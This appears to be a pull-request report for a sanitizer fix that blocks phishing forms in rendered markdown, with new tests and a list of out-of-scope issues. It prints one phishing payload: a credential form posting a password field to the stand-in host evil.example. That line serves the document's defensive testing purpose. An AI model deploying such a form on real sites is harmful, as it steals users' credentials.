# markdown-sanitize — issue #195: markdown sanitizer permits `<form action>`

Branch: `markdown-sanitize`, based on `7a0f220`.
Commit: `25bab77 Block form-control phishing in rendered markdown (#195)`

## Problem

`web/src/util/markdown.ts` called `DOMPurify.sanitize()` with default config.
Defaults preserve `<form action>`, `<input>`, `<button>`, `<select>`,
`<textarea>`, inline `style`, and `<a download>`.

Provenance is what made this exploitable. `IssueToCreateParams` in
`internal/platform/github/github.go` maps `issue.GetBody()` straight into
`Task.Description`, and comment bodies the same way. That content is authored by
arbitrary third parties and reaches the DOM through `unsafeHTML` at
`ft-inspector-desc.ts:233` and `ft-inspector-comments.ts:221`.

This is a phishing vector, not XSS. Script execution was already fully blocked
by DOMPurify defaults — independently re-confirmed here. What survived was a
working credential form rendered on Farm Table's own origin:

```
in : <form action="https://evil.example"><input name=token type=password><button>Sign in</button></form>
out: <form action="https://evil.example"><input name="token" type="password"><button>Sign in</button></form>
```

The deeper defect was that this boundary had **zero tests**. Nothing pinned the
script-execution properties either, so any future config change could have
silently reopened them.

## Change

`FORBID_TAGS: ['form','input','button','select','textarea','option']` and
`FORBID_ATTR: ['style','formaction','action','download']`. Tag and attribute are
both forbidden deliberately, so neither rule is load-bearing on its own.

Forbidding `input` would have stripped marked's task-list checkboxes. A private
`Marked` instance overrides the `checkbox` renderer to emit an inert
`<span class="ft-task-checkbox">☐/☑</span>` instead. Rationale in the report; the
short version is that dropping the checkbox makes `- [x] done` render
identically to `- [ ] todo`, which is silent semantic loss in a task tracker,
and the glyph costs five lines while keeping `input` fully forbidden.

New suite `web/src/util/markdown.test.ts` — 32 checks against the real exported
`renderMarkdown` (imported, not re-implemented), covering the form payload,
spoofing attributes, script-execution regressions, ordinary markdown rendering,
and task-list state. Wired into `npm test` alongside the existing test.

Both required mutations were run with real output; see the report.

## Not done, and why

- **`web/vite.config.ts` sets `sourcemap: true`, so `npm run build` emits
  `dist/assets/index-*.js.map` and the acceptance gate
  `find dist -name '*.map' | wc -l` returns **1**, not 0.** This is
  pre-existing: `sourcemap: true` is present at base `7a0f220` and on every
  branch checked (`origin/main`, `origin/task-state-web-ui-v2`,
  `origin/auth-stage4-deploy-prep`, `origin/auth-stage4-predeploy-fixes`,
  `origin/deploy-55-snapshot`). `dist/` is embedded into the Go binary via
  `go:embed`, so the map ships to production and exposes original TypeScript
  source. Not fixed here: the brief scoped this branch to the sanitizer and its
  tests, and `vite.config.ts` is shared build infrastructure that three in-flight
  branches could also touch. **Needs a separate owner.**
- **No CSP.** A Content-Security-Policy on the dashboard would be defence in
  depth behind the sanitizer (`form-action 'self'` would independently kill this
  class of bug). Out of scope, and it belongs with whoever owns deploy config.
- **Sanitizer output is not pinned against the real browser DOM.** Tests run
  under jsdom. jsdom's parser is not byte-identical to Chromium's, and mXSS
  classes are parser-specific. Accepted: jsdom is what the original audit used
  and the alternative is a browser harness this repo does not have.
- **`marked` is not configured with `gfm: false` or a link-scheme allowlist.**
  Not needed — DOMPurify handles scheme filtering, and narrowing marked would be
  widening the change beyond the reported issue.
- Did not touch the two `unsafeHTML` sinks. They are correct as written; the
  sanitizer is the right place for the control.
